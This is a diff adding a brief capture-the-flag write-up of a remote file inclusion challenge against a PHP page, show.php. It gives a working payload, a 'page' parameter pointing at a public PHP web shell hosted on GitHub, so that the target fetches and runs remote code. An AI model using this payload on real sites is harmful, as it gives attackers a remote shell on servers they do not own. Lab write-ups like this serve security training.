@@ -1,0 +1,11 @@
+This time, Drake's gone back to PHP, but yet again, there's been a problem...
+He's attempted to create a new site, check it out and see what you can find, a good friend of 
+mine mentioned something about RFI, if you can work out what that is.
+
+Remote file inclusion (RFI)
+
+so in the /site/show.php?page=http://www.google.com writing this i got
+    You are on the right track, you just need to think of how you can exploit this vulnerability
+
+so now we need to insert webshell in php so googling it we can find it
+    ?page=http://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php
